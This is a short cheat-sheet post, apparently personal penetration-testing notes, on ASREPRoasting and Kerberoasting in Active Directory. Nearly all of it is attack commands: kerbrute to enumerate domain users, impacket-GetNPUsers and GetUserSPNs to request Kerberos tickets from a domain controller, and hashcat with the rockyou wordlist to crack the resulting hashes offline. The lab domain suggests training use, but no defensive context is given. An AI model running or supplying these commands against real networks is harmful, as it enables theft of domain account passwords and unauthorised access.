---
title: Kerberoasting & ASREPRoasting
date: 2026-01-06 14:38:43

categories:
  - Active Directory
  - Exploitation
  - Kerberoasting & ASREPRoasting

tags:
  - impacket-GetNPUsers
  - impacket-GetNPUsers


cover: /img/
top_img: /img/bg-img.jpg
description: Exploit Kerberoasting & ASREPRoasting.
---


## ASREPRoasting

kerbrute

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

GetNPUsers

```bash
impacket-GetNPUsers domain/ -dc-ip dc-ip -no-pass -usersfile users.txt
```
> Cracking Ticket Offline

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

## Kerberoasting

> Requesting TGS Ticket For Specific Account : 

```bash
impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request-user username -outputfile username
```
> Requesting all TGS Tickets : 

```bash
impacket-GetUserSPNs -dc-ip dc-ip domain/Controlled-user -request
```
> Cracking Ticket Offline

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```